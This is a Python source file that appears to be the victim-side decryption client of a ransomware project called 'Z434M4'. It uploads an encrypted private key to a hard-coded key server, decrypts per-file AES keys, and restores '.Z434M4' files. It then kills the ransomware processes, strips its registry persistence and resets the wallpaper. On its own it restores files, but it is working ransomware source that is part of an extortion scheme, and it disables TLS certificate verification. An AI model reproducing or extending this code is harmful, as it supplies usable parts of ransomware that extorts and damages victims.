import os
import sys
import base64
import pickle
import json
import time
import subprocess
import ctypes
import winreg
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import urllib3

# Disable SSL warnings to reduce binary size
urllib3.disable_warnings()
http = urllib3.PoolManager(cert_reqs='CERT_NONE')

# Colors for console output
GREEN = '\033[1;32m'
RED = '\033[91m'
YELLOW = '\33[93m'
WHITE = '\33[97m'

# Basic config
ransomware_name = "Z434M4"
server_address = "http://192.168.8.116:8000/decrypt/"
home = os.path.expanduser("~")
ransomware_path = os.path.join(home, ransomware_name)
failed_log_path = os.path.join(ransomware_path, "failed_files.txt")

def get_unique_machine_id():
    """Get a unique ID for this machine"""
    try:
        # Try to get Windows product ID from registry
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                          r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
            return winreg.QueryValueEx(key, "ProductId")[0]
    except:
        # Fallback to hostname
        return os.environ.get('COMPUTERNAME', 'UNKNOWN')

def reset_wallpaper():
    """Reset Windows wallpaper to default"""
    try:
        SPI_SETDESKWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        
        # Try to use default Windows wallpaper
        default_wallpaper = os.path.join(os.environ['WINDIR'], 'Web', 'Wallpaper', 'Windows', 'img0.jpg')
        
        if not os.path.exists(default_wallpaper):
            default_wallpaper = os.path.join(os.environ['WINDIR'], 'Web', 'Wallpaper', 'Theme1', 'img1.jpg')
        
        if os.path.exists(default_wallpaper):
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, default_wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            )
            print(f"{GREEN}✓ Wallpaper reset{WHITE}")
        else:
            # Set solid color as fallback
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\\Colors", 0, 
                              winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, "0 120 215")
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, 
                              winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WallPaper", 0, winreg.REG_SZ, "")
            
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
            print(f"{GREEN}✓ Wallpaper reset to default color{WHITE}")
    except Exception as e:
        print(f"{YELLOW}Wallpaper reset failed: {e} (This doesn't affect decryption){WHITE}")

def kill_ransomware_processes():
    """Terminate ransomware processes"""
    try:
        # Kill known process names
        for process in ["daemon.exe", "Z434M4.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", process], 
                          stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        
        # Find and kill python processes running main.py
        subprocess.run(["taskkill", "/F", "/FI", "IMAGENAME eq python.exe", "/FI", "COMMANDLINE eq *main.py*"],
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        
        print(f"{GREEN}✓ Ransomware processes terminated{WHITE}")
    except Exception as e:
        print(f"{YELLOW}Process termination error: {e} (This doesn't affect decryption){WHITE}")

def clean_registry():
    """Remove ransomware registry entries"""
    try:
        # Common registry locations for malware persistence
        reg_locations = [
            (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
        ]
        
        # Suspicious value patterns
        suspicious = ["z434m4", "daemon", "decrypt", "ransom", "encrypt"]
        
        removals = 0
        for hkey, subkey in reg_locations:
            try:
                with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
                    # First pass: identify values to delete
                    values_to_delete = []
                    try:
                        i = 0
                        while True:
                            name, value, _ = winreg.EnumValue(key, i)
                            name_lower = name.lower()
                            value_lower = str(value).lower()
                            
                            if any(sus in name_lower for sus in suspicious) or \
                               any(sus in value_lower for sus in suspicious):
                                values_to_delete.append(name)
                            i += 1
                    except WindowsError:
                        # End of values reached
                        pass
                    
                    # Second pass: delete identified values
                    for name in values_to_delete:
                        try:
                            winreg.DeleteValue(key, name)
                            removals += 1
                        except:
                            pass
            except:
                # Can't access this key, just continue
                pass
                
        if removals > 0:
            print(f"{GREEN}✓ Removed {removals} suspicious registry entries{WHITE}")
        else:
            print(f"{GREEN}✓ No suspicious registry entries found{WHITE}")
    
    except Exception as e:
        print(f"{YELLOW}Registry cleaning error: {e} (This doesn't affect decryption){WHITE}")

def decrypt_aes_key(encrypted_key, private_key_pem):
    """Decrypt AES encryption key using the RSA private key"""
    try:
        # Load the private key
        private_key = serialization.load_pem_private_key(
            private_key_pem.encode('utf-8') if isinstance(private_key_pem, str) else private_key_pem,
            password=None
        )
        
        # Decrypt the AES key
        decrypted_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted_key
    except Exception as e:
        print(f"{RED}Error decrypting AES key: {str(e)}{WHITE}")
        raise

def decrypt_file(file_path, aes_key):
    """Decrypt a single file using the AES key"""
    # Import AESCipher only when needed to save memory
    from symmetric import AESCipher
    
    try:
        # Skip if file doesn't exist
        if not os.path.exists(file_path):
            return False, f"File not found: {file_path}"
        
        # Create AES cipher instance with the key
        cipher = AESCipher(aes_key)
        
        # Read encrypted content
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Decrypt the content
        try:
            decrypted_data = cipher.decrypt(encrypted_data)
        except Exception as e:
            return False, f"Decryption failed: {str(e)}"
        
        # Get the original filename
        base_filename = os.path.basename(file_path)
        original_ext = None
        original_path = file_path
        
        if base_filename.endswith(".Z434M4"):
            # Extract original extension from the decrypted data header (first 256 bytes should contain it)
            header = decrypted_data[:256]
            try:
                # Look for the extension marker in the header
                ext_marker = b"ORIGINAL_EXT:"
                if ext_marker in header:
                    ext_start = header.find(ext_marker) + len(ext_marker)
                    ext_end = header.find(b";", ext_start)
                    if ext_end > ext_start:
                        original_ext = header[ext_start:ext_end].decode('utf-8')
                        # Remove the header from the decrypted data
                        decrypted_data = decrypted_data[ext_end+1:]
                
                # If no extension was found in header, try to extract it from filename
                if not original_ext:
                    # Try to parse from filename (example.docx.Z434M4)
                    filename_without_ransomware_ext = base_filename[:-7]  # Remove .Z434M4
                    if '.' in filename_without_ransomware_ext:
                        parts = filename_without_ransomware_ext.split('.')
                        original_ext = parts[-1]  # Get last part as extension
                
                # Create path with original extension if found
                if original_ext:
                    # Remove .Z434M4 from path
                    path_without_ext = file_path[:-7]
                    # If path already ends with .ext (from original filename), use it directly
                    if not path_without_ext.endswith(f".{original_ext}"):
                        original_path = f"{path_without_ext}.{original_ext}"
                    else:
                        original_path = path_without_ext
                else:
                    # No extension found, just remove .Z434M4
                    original_path = file_path[:-7]
            except:
                # If any error in parsing, use the path without Z434M4
                original_path = file_path[:-7]  # Just remove .Z434M4
        
        # Debug print to help diagnose
        print(f"{YELLOW}Restoring file: {original_path}{WHITE}")
        
        # Make sure directory exists
        os.makedirs(os.path.dirname(original_path), exist_ok=True)
        
        # Write to temporary file first
        temp_path = original_path + ".tmp"
        try:
            with open(temp_path, 'wb') as f:
                f.write(decrypted_data)
                
            # Remove original if it exists
            if os.path.exists(original_path):
                os.remove(original_path)
                
            # Rename temp to original
            os.rename(temp_path, original_path)
        except Exception as e:
            if os.path.exists(temp_path):
                os.remove(temp_path)
            return False, f"File write error: {str(e)}"
        
        # Delete the encrypted file
        try:
            os.remove(file_path)
        except:
            pass  # It's okay if we can't delete the original
            
        return True, None
        
    except Exception as e:
        return False, f"Decryption process error: {str(e)}"

def send_to_server(encrypted_key):
    """Send encrypted private key to server and get decrypted key back"""
    max_attempts = 3
    
    for attempt in range(max_attempts):
        try:
            print(f"Connecting to recovery server (attempt {attempt+1}/{max_attempts})...")
            
            # Send the request
            response = http.request(
                'POST',
                server_address,
                body=encrypted_key,
                headers={'Content-Type': 'application/octet-stream'},
                timeout=30.0
            )
            
            # Check response
            if response.status == 200:
                print(f"{GREEN}✓ Server successfully decrypted the private key{WHITE}")
                return response.data.decode('utf-8')
            else:
                print(f"{YELLOW}Server returned error {response.status}: {response.data.decode()}{WHITE}")
                
        except Exception as e:
            print(f"{YELLOW}Connection error: {str(e)}{WHITE}")
            
        # Wait before retrying
        if attempt < max_attempts - 1:
            wait_time = 10 * (attempt + 1)
            print(f"Retrying in {wait_time} seconds...")
            time.sleep(wait_time)
    
    print(f"{RED}Failed to connect to server after {max_attempts} attempts.{WHITE}")
    print(f"{YELLOW}Please check your internet connection and try again.{WHITE}")
    sys.exit(1)

def decode_path(path_bytes):
    """Try multiple encodings to decode file paths"""
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            return path_bytes.decode(encoding)
        except UnicodeDecodeError:
            continue
    
    # Last resort: forced decode
    return path_bytes.decode('utf-8', errors='replace')

def format_key_for_server(encrypted_key):
    """Format the encrypted private key for server transmission"""
    try:
        # Handle list of chunks
        if isinstance(encrypted_key, list):
            encoded_chunks = []
            for chunk in encrypted_key:
                # Make sure each chunk is bytes
                if not isinstance(chunk, bytes):
                    chunk = bytes(chunk) if hasattr(chunk, '__bytes__') else str(chunk).encode('utf-8')
                # Base64 encode each chunk
                encoded_chunks.append(base64.b64encode(chunk).decode('utf-8'))
            
            # Create JSON array of base64-encoded chunks
            json_data = json.dumps(encoded_chunks)
            return base64.b64encode(json_data.encode('utf-8'))
            
        # Handle single chunk
        else:
            if not isinstance(encrypted_key, bytes):
                encrypted_key = bytes(encrypted_key) if hasattr(encrypted_key, '__bytes__') else str(encrypted_key).encode('utf-8')
                
            # Wrap in a list with single item
            encoded_chunks = [base64.b64encode(encrypted_key).decode('utf-8')]
            json_data = json.dumps(encoded_chunks)
            return base64.b64encode(json_data.encode('utf-8'))
            
    except Exception as e:
        print(f"{YELLOW}Error formatting key, using fallback method: {e}{WHITE}")
        # Fallback method
        json_data = json.dumps([base64.b64encode(str(encrypted_key).encode('utf-8')).decode('utf-8')])
        return base64.b64encode(json_data.encode('utf-8'))

def show_progress(current, total):
    """Display progress bar in console"""
    width = 50  # width of progress bar
    percent = min(100, int(current * 100 / total))
    filled = int(width * current // total)
    bar = '█' * filled + '-' * (width - filled)
    sys.stdout.write(f"\r{YELLOW}Progress: [{bar}] {percent}% ({current}/{total} files){WHITE}")
    sys.stdout.flush()

def main():
    print("\n" + "-" * 60)
    print(f"{GREEN}Z434M4 RANSOMWARE RECOVERY TOOL (LIGHTWEIGHT VERSION){WHITE}")
    print("-" * 60 + "\n")
    
    machine_id = get_unique_machine_id()
    
    print(f"{YELLOW}Step 1: Loading encrypted private key...{WHITE}")
    try:
        key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
        with open(key_path, 'rb') as f:
            encrypted_private_key = pickle.load(f)
        print(f"{GREEN}✓ Encrypted private key loaded{WHITE}")
    except Exception as e:
        print(f"{RED}ERROR: Failed to load encrypted private key: {str(e)}{WHITE}")
        print(f"{YELLOW}Please verify the file exists at: {key_path}{WHITE}")
        sys.exit(1)
    
    print(f"{YELLOW}Step 2: Preparing key for server request...{WHITE}")
    key_to_send = format_key_for_server(encrypted_private_key)
    print(f"{GREEN}✓ Key formatted for server{WHITE}")
    
    print(f"{YELLOW}Step 3: Requesting key decryption from server...{WHITE}")
    private_key_pem = send_to_server(key_to_send)
    
    print(f"{YELLOW}Step 4: Saving decrypted private key...{WHITE}")
    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
        f.write(private_key_pem.encode('utf-8'))
    print(f"{GREEN}✓ Private key saved{WHITE}")
    
    print(f"{YELLOW}Step 5: Loading encrypted AES keys...{WHITE}")
    try:
        keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
        with open(keys_path) as f:
            content = f.read().strip().split('\n')
        print(f"{GREEN}✓ Encrypted AES keys loaded ({len(content)} files found){WHITE}")
    except Exception as e:
        print(f"{RED}ERROR: Failed to load AES keys: {str(e)}{WHITE}")
        print(f"{YELLOW}Please verify the file exists at: {keys_path}{WHITE}")
        sys.exit(1)
    
    print(f"{YELLOW}Step 6: Decrypting files...{WHITE}")
    
    # Process all files
    successful = 0
    failed = []
    total = len(content)
    
    # Batch process files with progress display
    for i, line in enumerate(content):
        if i % 10 == 0 or i == total - 1:
            show_progress(i, total)
        
        try:
            parts = line.split(' ')
            if len(parts) != 2:
                failed.append(f"Invalid format: {line}")
                continue
                
            # Get key and path
            encrypted_aes_key = base64.b64decode(parts[0])
            path_bytes = base64.b64decode(parts[1])
            
            # Decrypt AES key with private key
            aes_key = decrypt_aes_key(encrypted_aes_key, private_key_pem)
            
            # Handle path encoding
            path_str = decode_path(path_bytes)
            
            # Decrypt the file
            success, error = decrypt_file(path_str, aes_key)
            
            if success:
                successful += 1
            else:
                failed.append(f"{path_str}: {error}")
                
        except Exception as e:
            failed.append(f"Processing error: {str(e)}")
    
    # Show final progress
    show_progress(total, total)
    print("\n")
    
    # Report results
    print(f"\n{GREEN}Successfully decrypted: {successful} files{WHITE}")
    
    if failed:
        print(f"{RED}Failed to decrypt: {len(failed)} files{WHITE}")
        
        # Save failed files for reference
        with open(failed_log_path, 'w') as f:
            for entry in failed:
                f.write(f"{entry}\n")
        print(f"{YELLOW}Failed files list saved to: {failed_log_path}{WHITE}")
    else:
        print(f"{GREEN}✓ All files successfully decrypted!{WHITE}")
    
    print(f"\n{YELLOW}Step 7: Cleaning up system...{WHITE}")
    kill_ransomware_processes()
    clean_registry()
    reset_wallpaper()
    
    print(f"\n{GREEN}=== RECOVERY COMPLETE ==={WHITE}")
    print(f"{GREEN}Your system has been restored.{WHITE}")
    print(f"{YELLOW}For additional security, please run a full antivirus scan.{WHITE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}Decryption interrupted by user.{WHITE}")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n{RED}Unhandled error: {str(e)}{WHITE}")
        print(f"{YELLOW}Please report this error and try again.{WHITE}")
        sys.exit(1)